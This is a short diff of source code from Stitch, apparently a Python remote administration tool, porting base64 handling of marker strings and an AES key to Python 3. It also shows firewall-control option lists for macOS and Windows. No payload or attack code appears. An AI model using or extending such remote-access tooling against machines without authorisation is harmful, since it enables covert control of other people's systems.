@@ -30,8 +30,8 @@ https://github.com/nathanlopez/Stitch                    :"
 '''
 
 st_tag      = "[Stitch]"
-st_eof      = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')
-st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz')
+st_eof      = base64.b64decode('c3RpdGNoNjI2aGN0aXRz')           # kept as bytes for network layer
+st_complete = base64.b64decode('c3RpdGNoLjpjb21wbGV0ZTouY2h0aXRz').decode('latin-1')
 
 options_fw_osx    = ['status','open','close']
 options_fw_win    = ['status','open','close','allow']
@@ -74,7 +74,7 @@ for p in st_paths:
 
 if not os.path.exists(st_aes):
     key  = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(32))
-    key  = base64.b64encode(key)
+    key = base64.b64encode(key.encode())
     code = '''# Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
